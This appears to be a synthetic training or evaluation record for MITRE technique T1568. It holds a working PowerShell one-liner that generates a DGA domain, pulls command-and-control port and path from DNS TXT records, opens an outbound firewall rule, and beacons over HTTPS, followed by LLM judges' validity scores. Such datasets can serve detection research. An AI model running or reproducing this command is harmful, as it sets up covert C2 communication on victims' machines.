@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $dom=('cdn{0}{1}.telemetry-cdn.com' -f (Get-Random -Min 1 -Max 9),(Get-Date -Format 'MMdd')); $txt=Resolve-DnsName $dom -Type TXT -Server '8.8.8.8' -ErrorAction SilentlyContinue; $txtstr=($txt | ForEach-Object { $_.Strings -join '' }) -join ''; $port=((Select-String -InputObject $txtstr -Pattern 'p=(\\d+)' -AllMatches).Matches.Value -replace 'p='); if(-not $port){ $port=10443 }; $path=((Select-String -InputObject $txtstr -Pattern 'path=([/\\w\\-]+)' -AllMatches).Matches.Value -replace 'path='); if([string]::IsNullOrWhiteSpace($path)){ $path='/update' }; $a=Resolve-DnsName $dom -Type A -Server '8.8.8.8' -ErrorAction SilentlyContinue; if($a){ netsh advfirewall firewall add rule name=('out_'+$port) dir=out action=allow protocol=TCP remoteport=$port | Out-Null; Invoke-WebRequest -Uri ('https://{0}:{1}{2}' -f $dom,$port,$path) -Headers @{ Host=$dom } -UseBasicParsing -TimeoutSec 6 } }",
+  "explanation": "Retrieves C2 parameters (port and path) from TXT records of a DGA domain, then opens the advertised port and connects over HTTPS using that path.",
+  "rationale_steps": [
+    "Generate a DGA domain and query TXT for dynamic configuration.",
+    "Parse the TXT payload for port and URL path.",
+    "Resolve A records and permit outbound traffic to the dynamic port.",
+    "Beacon to the constructed endpoint leveraging Host-based routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-4dcb8624",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced braces/quotes, valid parameters, and proper separators, so it should parse and run as written.",
+        "semantic_score": 4,
+        "semantic_justification": "It implements dynamic resolution by DGA-like domain generation, TXT-based parameter retrieval, DNS A lookup, and HTTPS beaconing, though the firewall rule addition typically requires admin and may fail under the stated privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:53:25.593172Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell script block is fully well-formed with balanced braces, parentheses, and quotes, valid cmdlet syntax, proper use of semicolons as statement separators, and no detectable parsing errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1568 dynamic resolution by algorithmically generating a date-seeded DGA domain, querying TXT records via an external DNS resolver to retrieve C2 parameters (port and path), resolving the A record to confirm reachability, dynamically opening a firewall rule for the retrieved port, and then beaconing over HTTPS to the constructed endpoint — fully matching the described technique and explanation.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:15:44.763969Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell script block is well-formed with correct variable interpolation, proper use of cmdlets, and balanced delimiters.",
+        "semantic_score": 4,
+        "semantic_justification": "The command accurately implements a DGA-based resolution and C2 parameter retrieval, though the 'netsh' command requires administrative privileges which contradicts the 'None' privilege metadata provided.",
+        "combined_score": 4.5,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T00:15:47.852888Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
